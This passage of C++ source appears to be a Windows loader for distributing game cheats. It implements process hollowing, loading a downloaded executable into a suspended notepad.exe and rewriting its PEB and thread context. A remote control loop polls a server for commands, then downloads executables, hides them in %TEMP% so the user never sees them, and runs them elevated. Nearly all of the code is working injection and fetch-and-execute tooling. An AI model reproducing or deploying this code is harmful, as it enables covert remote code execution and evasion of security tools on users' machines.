    // 1. Spawn host suspended.
    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    std::string hostPath = std::string(sysDir) + "\\notepad.exe";
    std::string hostCmd  = std::string("\"") + hostPath + "\"";

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessA(hostPath.c_str(), hostCmd.data(),
                        NULL, NULL, FALSE,
                        CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) {
        g_lastErr = "CreateProcess(notepad, SUSPENDED) failed: " +
                    std::to_string(GetLastError());
        return false;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtQueryInfoProc = (pNtQueryInformationProcess)GetProcAddress(
        ntdll, "NtQueryInformationProcess");
    auto NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(
        ntdll, "NtUnmapViewOfSection");
    if (!NtQueryInfoProc || !NtUnmap) {
        g_lastErr = "ntdll resolves failed";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // 2. Locate the child's PEB.
    PROCESS_BASIC_INFORMATION pbi{};
    ULONG retLen = 0;
    if (NtQueryInfoProc(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen) != 0) {
        g_lastErr = "NtQueryInformationProcess failed";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // 3. Read the host's ImageBaseAddress from the child's PEB (+0x10 on x64).
    ULONGLONG hostImageBase = 0;
    ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x10,
                      &hostImageBase, sizeof(hostImageBase), NULL);

    // 4. Unmap notepad's image.
    NtUnmap(pi.hProcess, (PVOID)hostImageBase);

    // 5. Allocate at the payload's preferred base (fallback to any base).
    DWORD    imgSize       = srcNt->OptionalHeader.SizeOfImage;
    ULONGLONG preferredBase = srcNt->OptionalHeader.ImageBase;
    LPVOID   newBase       = VirtualAllocEx(pi.hProcess, (LPVOID)preferredBase, imgSize,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) {
        newBase = VirtualAllocEx(pi.hProcess, NULL, imgSize,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!newBase) {
        g_lastErr = "VirtualAllocEx failed: " + std::to_string(GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // 6. Build the final image in a local buffer.
    std::vector<BYTE> buf(imgSize, 0);
    memcpy(buf.data(), data.data(), srcNt->OptionalHeader.SizeOfHeaders);
    PIMAGE_NT_HEADERS bufNt = (PIMAGE_NT_HEADERS)(buf.data() + dos->e_lfanew);
    bufNt->OptionalHeader.ImageBase = (ULONGLONG)newBase;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(srcNt);
    for (WORD i = 0; i < srcNt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData) {
            memcpy(buf.data() + sec->VirtualAddress,
                   data.data() + sec->PointerToRawData,
                   sec->SizeOfRawData);
        }
    }

    // 7. Apply relocations if we didn't land on the preferred base.
    ptrdiff_t delta = (ptrdiff_t)((uintptr_t)newBase - (uintptr_t)preferredBase);
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY* rel =
            &bufNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (rel->Size > 0) {
            PIMAGE_BASE_RELOCATION br = (PIMAGE_BASE_RELOCATION)(buf.data() + rel->VirtualAddress);
            while (br->VirtualAddress) {
                DWORD cnt = (br->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* list = (WORD*)((BYTE*)br + sizeof(IMAGE_BASE_RELOCATION));
                BYTE* dst = buf.data() + br->VirtualAddress;
                for (DWORD j = 0; j < cnt; j++) {
                    int type = list[j] >> 12;
                    int off  = list[j] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        *(ULONGLONG*)(dst + off) += (ULONGLONG)delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        *(DWORD*)(dst + off) += (DWORD)delta;
                    }
                }
                br = (PIMAGE_BASE_RELOCATION)((BYTE*)br + br->SizeOfBlock);
            }
        }
    }

    // 8. Resolve imports locally — kernel32/user32/etc are at the same VA
    //    in every process on the same boot, so the IAT we write is valid
    //    inside the child.
    IMAGE_DATA_DIRECTORY* imp =
        &bufNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (imp->Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR desc =
            (PIMAGE_IMPORT_DESCRIPTOR)(buf.data() + imp->VirtualAddress);
        while (desc->Name) {
            const char* dllName = (const char*)(buf.data() + desc->Name);
            HMODULE h = LoadLibraryA(dllName);
            if (!h) {
                g_lastErr = std::string("LoadLibrary failed: ") + dllName +
                            "\n\nBundle apps (Telegram, Discord, browsers) can't run in-memory — their DLLs live next to the exe on disk.";
                TerminateProcess(pi.hProcess, 1);
                return false;
            }
            ULONGLONG* thunkRef = (ULONGLONG*)(buf.data() +
                (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
            ULONGLONG* funcRef  = (ULONGLONG*)(buf.data() + desc->FirstThunk);
            for (; *thunkRef; ++thunkRef, ++funcRef) {
                FARPROC p = nullptr;
                if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) {
                    p = GetProcAddress(h, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
                } else {
                    PIMAGE_IMPORT_BY_NAME byName =
                        (PIMAGE_IMPORT_BY_NAME)(buf.data() + *thunkRef);
                    p = GetProcAddress(h, (LPCSTR)&byName->Name);
                }
                if (!p) {
                    g_lastErr = std::string("GetProcAddress failed in ") + dllName;
                    TerminateProcess(pi.hProcess, 1);
                    return false;
                }
                *funcRef = (ULONGLONG)p;
            }
            ++desc;
        }
    }

    // 9. Push the image into the child.
    if (!WriteProcessMemory(pi.hProcess, newBase, buf.data(), imgSize, NULL)) {
        g_lastErr = "WriteProcessMemory(image) failed: " + std::to_string(GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // 10. Update the child's PEB.ImageBaseAddress so
    //     GetModuleHandle(NULL) inside the payload returns newBase.
    WriteProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x10,
                       &newBase, sizeof(newBase), NULL);

    // 10b. Rewrite the FIRST LDR_DATA_TABLE_ENTRY (the .exe entry) so it
    //      describes our image — DllBase / EntryPoint / SizeOfImage.
    //      Without this, RtlLookupFunctionEntry can't find unwind info for
    //      our address range and the process dies on the first exception
    //      (which the CRT startup routinely raises + catches). Also fixes
    //      GetModuleFileName(NULL), resource loading, LoadLibrary(NULL).
    {
        ULONGLONG ldrAddr = 0;
        ReadProcessMemory(pi.hProcess,
                          (BYTE*)pbi.PebBaseAddress + 0x18,  // PEB.Ldr
                          &ldrAddr, sizeof(ldrAddr), NULL);
        if (ldrAddr) {
            ULONGLONG firstEntry = 0;
            // PEB_LDR_DATA.InLoadOrderModuleList.Flink at offset 0x10.
            // The Flink points at InLoadOrderLinks of the FIRST
            // LDR_DATA_TABLE_ENTRY, which is at offset 0 of that struct.
            ReadProcessMemory(pi.hProcess,
                              (BYTE*)ldrAddr + 0x10,
                              &firstEntry, sizeof(firstEntry), NULL);
            if (firstEntry) {
                ULONGLONG entryVA = (ULONGLONG)newBase +
                                    srcNt->OptionalHeader.AddressOfEntryPoint;
                DWORD sz = imgSize;
                // DllBase = 0x30, EntryPoint = 0x38, SizeOfImage = 0x40 (x64)
                WriteProcessMemory(pi.hProcess, (BYTE*)firstEntry + 0x30,
                                   &newBase,  sizeof(newBase),  NULL);
                WriteProcessMemory(pi.hProcess, (BYTE*)firstEntry + 0x38,
                                   &entryVA,  sizeof(entryVA),  NULL);
                WriteProcessMemory(pi.hProcess, (BYTE*)firstEntry + 0x40,
                                   &sz,       sizeof(sz),       NULL);
                std::cout << "[loader] patched LDR entry @ 0x" << std::hex
                          << firstEntry << std::dec << std::endl;
            }
        }
    }

    // 11. Point the suspended thread at our entry.
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        g_lastErr = "GetThreadContext failed";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
    // On x64 the initial thread starts at RtlUserThreadStart which calls
    // the routine in Rcx with the argument in Rdx. Set Rcx to our entry.
    ctx.Rcx = (ULONGLONG)newBase + srcNt->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        g_lastErr = "SetThreadContext failed";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // 12. Fire.
    ResumeThread(pi.hThread);

    std::cout << "[loader] hollowed host pid=" << pi.dwProcessId
              << " title='" << title << "' base=" << newBase
              << " entry=" << (void*)ctx.Rcx << std::endl;
    CloseHandle(pi.hThread);

    // Monitor the child. If it dies within ~2s of resume we log it so the
    // user knows the payload silently exited (either headless & finished,
    // or crashed before creating a visible window).
    DWORD childPid = pi.dwProcessId;
    HANDLE childProc = pi.hProcess;
    std::string t = title;
    std::thread([childPid, childProc, t]() {
        DWORD w = WaitForSingleObject(childProc, 2000);
        if (w == WAIT_OBJECT_0) {
            DWORD ec = 0;
            GetExitCodeProcess(childProc, &ec);
            std::cout << "[loader] host pid=" << childPid
                      << " (" << t << ") exited within 2s. exit code=0x"
                      << std::hex << ec << std::dec
                      << " — likely headless or crashed pre-window."
                      << std::endl;
        } else {
            std::cout << "[loader] host pid=" << childPid
                      << " (" << t << ") still running after 2s — payload took control."
                      << std::endl;
        }
        CloseHandle(childProc);
    }).detach();

    return true;
}

static bool spawn_mem_child(const std::string& url, const std::string& title) {
    char selfPath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) return false;

    // Wrap in `cmd.exe /k` so the console STAYS OPEN even if the child dies
    // instantly — otherwise a crash / immediate ExitProcess would slam the
    // window shut before you could read any error. The child also writes
    // everything to %TEMP%\yully-child.log as a fallback.
    std::string cmd = std::string("cmd.exe /k \"\"") + selfPath +
                      "\" --child-mem \"" + url + "\"\"";

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    PROCESS_INFORMATION pi{};
    BOOL ok = CreateProcessA(NULL, cmd.data(), NULL, NULL, FALSE,
                             CREATE_NEW_CONSOLE,
                             NULL, NULL, &si, &pi);
    if (!ok) {
        std::cerr << "[loader] spawn child failed: " << GetLastError() << std::endl;
        return false;
    }
    std::cout << "[loader] spawned mem-host pid=" << pi.dwProcessId
              << " for " << (title.empty() ? url : title)
              << " (log: %TEMP%\\yully-child.log)" << std::endl;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

/* ========== Command handler ========== */
static void handle_command(const std::string& payload) {
    std::string type = extract_str(payload, "type");
    std::cout << "[loader] cmd: " << type << std::endl;

    if (type == "ping") {
        MessageBoxA(NULL, "Pong", "Loader", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
        return;
    }

    if (type == "launch") {
        std::string url = extract_str(payload, "url");
        std::string title = extract_str(payload, "title");
        // Optional exchange token minted by the dashboard's
        // /api/auth/exchange endpoint. If present we plant it as
        // YULLY_TOKEN so the child (the cheat / product) can pick it
        // up and handshake with /api/auth/handshake. See
        // Loader/examples/auth_handshake.cpp for the product side.
        std::string token = extract_str(payload, "token");
        std::string apiHost = extract_str(payload, "apiHost");
        if (url.empty()) { std::cerr << "[loader] launch without url" << std::endl; return; }

        if (!token.empty()) {
            SetEnvironmentVariableA("YULLY_TOKEN", token.c_str());
            std::cout << "[loader] token planted (YULLY_TOKEN) " << token.substr(0, 6) << "…" << std::endl;
        }
        if (!apiHost.empty()) {
            SetEnvironmentVariableA("YULLY_HOST", apiHost.c_str());
        }

        std::cout << "[loader] launching " << url << std::endl;

        std::vector<unsigned char> bytes;
        if (!http_download_bytes(url, bytes) || bytes.empty()) {
            MessageBoxA(NULL, "Download failed. Check server & URL.",
                        "Loader — Launch Error", MB_OK | MB_ICONERROR | MB_TOPMOST);
            return;
        }
        std::cout << "[loader] downloaded " << bytes.size() << " bytes" << std::endl;

        // Match perm's approach exactly (see permspoofer.com/loader):
        //   * write to a GUID-named .exe under %TEMP%
        //   * mark it hidden so the customer never sees it
        //   * ShellExecute with "runas" so the payload's UAC manifest fires
        //   * DO NOT delete — the exe locks its own image while running and
        //     %TEMP% cleanup grabs it on next reboot. Every launch = fresh
        //     random name, so nothing accumulates that the user can see.
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);

        UUID id;
        UuidCreate(&id);
        char* uuidStr = nullptr;
        UuidToStringA(&id, (RPC_CSTR*)&uuidStr);
        std::string name = "_ps";
        if (uuidStr) { name += std::string(uuidStr, 10); RpcStringFreeA((RPC_CSTR*)&uuidStr); }
        else         { name += std::to_string(GetTickCount()); }
        std::string outPath = std::string(tempPath) + name + ".exe";

        FILE* f = fopen(outPath.c_str(), "wb");
        if (!f) {
            MessageBoxA(NULL, "Failed to open temp path.",
                        "Loader — Launch Error", MB_OK | MB_ICONERROR | MB_TOPMOST);
            return;
        }
        fwrite(bytes.data(), 1, bytes.size(), f);
        fclose(f);
        SetFileAttributesA(outPath.c_str(), FILE_ATTRIBUTE_HIDDEN);

        SHELLEXECUTEINFOA sei{};
        sei.cbSize = sizeof(sei);
        sei.fMask  = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC;
        sei.lpVerb = "runas";               // fire UAC if the exe's manifest asks
        sei.lpFile = outPath.c_str();
        sei.nShow  = SW_SHOWNORMAL;
        if (!ShellExecuteExA(&sei)) {
            DWORD err = GetLastError();
            // 1223 = ERROR_CANCELLED (user clicked No on UAC).
            // Fall back to a plain CreateProcess for exes without a UAC manifest.
            if (err == ERROR_CANCELLED) {
                std::cout << "[loader] user cancelled UAC prompt" << std::endl;
                DeleteFileA(outPath.c_str());
                return;
            }
            // Try non-elevated as a fallback.
            STARTUPINFOA si{}; si.cb = sizeof(si);
            PROCESS_INFORMATION pi{};
            if (!CreateProcessA(NULL, (LPSTR)outPath.data(), NULL, NULL, FALSE,
                                0, NULL, NULL, &si, &pi)) {
                DeleteFileA(outPath.c_str());
                std::string msg = "Launch failed (err=" + std::to_string(err) + ")";
                MessageBoxA(NULL, msg.c_str(),
                            "Loader — Launch Error", MB_OK | MB_ICONERROR | MB_TOPMOST);
                return;
            }
            sei.hProcess = pi.hProcess;
            CloseHandle(pi.hThread);
        }

        std::cout << "[loader] launched title='" << title
                  << "' path=" << outPath << std::endl;

        // Best-effort cleanup after the payload exits (payload holds an image
        // lock while running so this WOULD fail immediately; we just wait).
        // If the loader dies before the payload does, the file stays until
        // Windows %TEMP% housekeeping sweeps it — same as perm's design.
        if (sei.hProcess) {
            HANDLE proc = sei.hProcess;
            std::string path = outPath;
            std::string t = title;
            std::thread([proc, path, t]() {
                WaitForSingleObject(proc, INFINITE);
                DWORD ec = 0;
                GetExitCodeProcess(proc, &ec);
                CloseHandle(proc);
                for (int i = 0; i < 20; ++i) {
                    if (DeleteFileA(path.c_str())) break;
                    std::this_thread::sleep_for(std::chrono::milliseconds(250));
                }
                std::cout << "[loader] " << t << " exited rc=0x"
                          << std::hex << ec << std::dec
                          << " (temp cleaned)" << std::endl;
            }).detach();
        }
        return;
    }

    if (type == "welcome") return;
}

/* ========== WebSocket session ========== */
static bool ws_session() {
    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(SERVER_HOST, SERVER_PORT, &hints, &res) != 0) return false;

    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) { freeaddrinfo(res); return false; }

    if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
        closesocket(s); freeaddrinfo(res); return false;
    }
    freeaddrinfo(res);

    std::string key = gen_ws_key();
    std::string req =
        std::string("GET ") + WS_PATH + " HTTP/1.1\r\n" +
        "Host: " + SERVER_HOST + ":" + SERVER_PORT + "\r\n" +
        "Upgrade: websocket\r\n" +
        "Connection: Upgrade\r\n" +
        "Sec-WebSocket-Key: " + key + "\r\n" +
        "Sec-WebSocket-Version: 13\r\n" +
        "User-Agent: WebLoader/1.0\r\n\r\n";
    if (!send_all(s, req.data(), (int)req.size())) { closesocket(s); return false; }

    std::string headers = recv_http_headers(s);
    if (headers.find("101") == std::string::npos ||
        headers.find("Sec-WebSocket-Accept") == std::string::npos) {
        std::cerr << "[loader] handshake failed" << std::endl;
        closesocket(s);
        return false;
    }
    std::string expected = sha1_b64(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11");
    if (headers.find(expected) == std::string::npos) {
        std::cerr << "[loader] bad Sec-WebSocket-Accept" << std::endl;
        closesocket(s);
        return false;
    }
    std::cout << "[loader] connected." << std::endl;

    send_text(s, "{\"type\":\"hello\",\"agent\":\"WebLoader/1.0\"}");

    while (true) {
        Frame f = recv_frame(s);
        if (!f.ok) break;
        if (f.opcode == 0x8) { std::cout << "[loader] server closed" << std::endl; break; }
        if (f.opcode == 0x9) {
            std::string pong;
            pong += (char)0x8A;
            pong += (char)(0x80 | (unsigned char)f.payload.size());
            unsigned char mask[4] = {0,0,0,0};
            pong.append((char*)mask, 4);
            pong += f.payload;
            send_all(s, pong.data(), (int)pong.size());
            continue;
        }
        if (f.opcode == 0x1 || f.opcode == 0x2) {
            std::string payload = f.payload;
            std::thread([payload]() { handle_command(payload); }).detach();
        }
    }
    closesocket(s);
    return true;
}

/* ========== File logger — belt-and-suspenders for child diagnostics ========== */
static FILE* g_childLog = nullptr;
static void child_log(const std::string& s) {
    if (!g_childLog) {
        char tmp[MAX_PATH];
        GetTempPathA(MAX_PATH, tmp);
        std::string p = std::string(tmp) + "yully-child.log";
        g_childLog = fopen(p.c_str(), "a");
    }
    if (g_childLog) {
        SYSTEMTIME st; GetLocalTime(&st);
        fprintf(g_childLog, "[%02d:%02d:%02d.%03d] %s\n",
                st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, s.c_str());
        fflush(g_childLog);
    }
    std::cout << s << std::endl;
    std::cout.flush();
}

/* ========== CHILD mode: download → memload → run entry ========== */
static int run_child_mem(const std::string& url) {
    child_log("================================================");
    child_log("[child] mem-host starting  pid=" + std::to_string(GetCurrentProcessId()));
    child_log("[child] url = " + url);
    child_log("================================================");

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        child_log("[child] WSAStartup failed");
        MessageBoxA(NULL, "Child: WSAStartup failed.",
                    "Loader — Child Error", MB_OK | MB_ICONERROR | MB_TOPMOST);
        return 1;
    }

    child_log("[child] downloading payload...");
    std::vector<unsigned char> bytes;
    if (!http_download_bytes(url, bytes) || bytes.empty()) {
        child_log("[child] download failed");
        MessageBoxA(NULL, "Child: payload download failed.\n\nCheck that the "
                    "dashboard is running and the URL is reachable.",
                    "Loader — Child Error", MB_OK | MB_ICONERROR | MB_TOPMOST);
        child_log("[child] press enter to close...");
        std::cin.get();
        return 2;
    }
    child_log("[child] got " + std::to_string(bytes.size()) + " bytes. mapping...");

    PMEM_MODULE m = nullptr;
    if (!memload_prepare(bytes, m) || !m) {
        child_log("[child] map fail: " + g_lastErr);
        std::string msg = "In-memory PE mapping failed.\n\nReason: " +
                          (g_lastErr.empty() ? std::string("unknown") : g_lastErr);
        MessageBoxA(NULL, msg.c_str(),
                    "Loader — Child Error", MB_OK | MB_ICONERROR | MB_TOPMOST);
        child_log("[child] press enter to close...");
        std::cin.get();
        return 3;
    }
    {
        char buf[128];
        snprintf(buf, sizeof(buf), "[child] mapped at %p (size %u). jumping to entry...",
                 (void*)m->base, (unsigned)m->sizeOfImage);
        child_log(buf);
    }

    // Run payload on THIS thread. If it ExitProcesses we die here — which is
    // the whole point (loader parent stays alive).
    int rc = memload_execute(m);

    child_log("[child] payload returned rc=" + std::to_string(rc));
    mem_free(m);
    WSACleanup();
    return rc;
}

// Assign the current process to a Windows Job Object that kills every
// process in the job when the last handle to the job closes. Because we
// spawn the electron island via CreateProcess (not CREATE_BREAKAWAY_FROM_JOB)
// it, its cmd shim, npx and the electron.exe processes all inherit this
// job — so when loader.exe dies (user hits X on the cmd window, closes
// the rebuild-and-run.bat window, task-manager kill, whatever), the OS
// takes them all down together.
static HANDLE g_kill_switch_job = NULL;
static void install_child_kill_switch() {
    g_kill_switch_job = CreateJobObjectA(NULL, NULL);
    if (!g_kill_switch_job) {
        std::cerr << "[loader] warn: CreateJobObject failed err=" << GetLastError() << std::endl;
        return;
    }
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli{};
    // Allow explicit breakaway so we can spawn the browser as an outlived
    // process — everything else that DOESN'T set CREATE_BREAKAWAY_FROM_JOB
    // still gets killed with us (electron island, product hosts, etc.)
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
                                          | JOB_OBJECT_LIMIT_BREAKAWAY_OK;
    if (!SetInformationJobObject(g_kill_switch_job,
                                 JobObjectExtendedLimitInformation,
                                 &jeli, sizeof(jeli))) {
        std::cerr << "[loader] warn: SetInformationJobObject failed err="
                  << GetLastError() << std::endl;
    }
    if (!AssignProcessToJobObject(g_kill_switch_job, GetCurrentProcess())) {
        std::cerr << "[loader] warn: AssignProcessToJobObject failed err="
                  << GetLastError() << std::endl;
    } else {
        std::cout << "[loader] child kill-switch armed" << std::endl;
    }
}

// Console close handler — Ctrl+C, X-button, taskbar close, log-off all
// route through here. We CloseHandle on the job which triggers KILL_ON_JOB_CLOSE
// and stops every child before Windows tears our process down.
static BOOL WINAPI console_ctrl_handler(DWORD ctrlType) {
    (void)ctrlType;
    if (g_kill_switch_job) {
        CloseHandle(g_kill_switch_job);
        g_kill_switch_job = NULL;
    }
    return FALSE; // let default handler proceed with process shutdown
}

// HTTPS-polling control plane — replaces the localhost WebSocket for
// the customer-facing distribution. Every 2 seconds we hit
// /api/loader/poll?id=<uuid> on the configured host and drain any
// commands the dashboard queued via /api/loader/dispatch.
static void poll_session() {
    std::cout << "[loader] control plane: "
              << (g_api_https ? "https" : "http") << "://"
              << g_api_host << ":" << g_api_port
              << "/api/loader/poll?id=" << g_loader_id.substr(0, 8) << "..." << std::endl;
    while (true) {
        std::string body;
        long sc = 0;
        std::string path = "/api/loader/poll?id=" + g_loader_id;
        bool ok = wh_get_string(g_api_host, g_api_port, g_api_https, path, body, &sc);
        if (!ok || sc != 200) {
            std::cerr << "[loader] poll failed sc=" << sc << " — retrying in 5s" << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        auto cmds = extract_object_array(body, "commands");
        for (auto& c : cmds) {
            std::string payload = c;
            std::thread([payload]() { handle_command(payload); }).detach();
        }
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
}

int main(int argc, char** argv) {
    (void)argc; (void)argv;

    install_child_kill_switch();
    SetConsoleCtrlHandler(console_ctrl_handler, TRUE);
    configure_from_env();

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }
    std::cout << "[loader] id=" << g_loader_id.substr(0, 8) << " host=" << g_api_host << std::endl;
    spawn_island_overlay();

    // Open the dashboard in the customer's default browser with the
    // session parameter so it can auto-connect to us. Prefer Chrome / Edge
    // with --start-maximized so it lands as a bordered maximized window.
    {
        std::string scheme = g_api_https ? "https://" : "http://";
        std::string url = scheme + g_api_host;
        if ((g_api_https && g_api_port != 443) || (!g_api_https && g_api_port != 80)) {
            url += ":" + std::to_string(g_api_port);
        }
        url += "/?session=" + g_loader_id;

        const char* browsers[] = {
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
            nullptr
        };
        bool spawned = false;
        for (int i = 0; browsers[i]; i++) {
            if (GetFileAttributesA(browsers[i]) == INVALID_FILE_ATTRIBUTES) continue;
            std::string cmd = std::string("\"") + browsers[i] +
                              "\" --start-maximized --new-window \"" + url + "\"";
            STARTUPINFOA si{}; si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_SHOWMAXIMIZED;
            PROCESS_INFORMATION pi{};
            if (CreateProcessA(NULL, cmd.data(), NULL, NULL, FALSE,
                               CREATE_BREAKAWAY_FROM_JOB | DETACHED_PROCESS,
                               NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
                std::cout << "[loader] opened dashboard in browser (maximized)" << std::endl;
                spawned = true; break;
            }
        }
        if (!spawned) {
            // Fallback — default browser via shell association
            ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
            std::cout << "[loader] opened dashboard in default browser" << std::endl;
        }
    }

    // On localhost (dev), keep the legacy WebSocket path — it's a lot
    // lower-latency for the operator on the same machine. On any public
    // host we go HTTPS polling because Vercel serverless can't hold a WS.
    bool useLocalWS = (g_api_host == "127.0.0.1" || g_api_host == "localhost");
    if (useLocalWS) {
        while (true) {
            ws_session();
            std::cout << "[loader] reconnecting in 2s..." << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    } else {
        poll_session();
    }
    WSACleanup();
    return 0;
}
